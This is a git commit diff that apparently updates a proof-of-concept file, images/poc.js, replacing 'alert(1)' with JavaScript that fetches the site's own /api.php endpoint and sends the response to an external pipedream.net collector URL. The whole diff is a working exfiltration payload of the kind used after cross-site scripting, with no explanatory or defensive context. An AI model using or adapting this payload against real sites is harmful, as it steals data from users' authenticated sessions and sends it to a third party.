23e24c7a6d9ab3a2ba06be0c9e6cfc9bf68aa7cc
hashgrem <44004683+hashgrem@users.noreply.github.com>
2024-10-31 16:26:01 +0100

    Update poc.js

--- images/poc.js
+++ images/poc.js
@@ -1,1 +1,14 @@
-alert(1);
+const targetUrl = "/api.php";
+
+function fetchInternalAPI() {
+    console.log('func called');
+    fetch(targetUrl)
+        .then(response => response.text())
+        .then(data => {
+            console.log("Resp from /api.php: ", data);
+            fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
+        })
+        .catch(error => console.error("Error fetching /api.php:", error));
+}
+
+setTimeout(fetchInternalAPI, 2000);
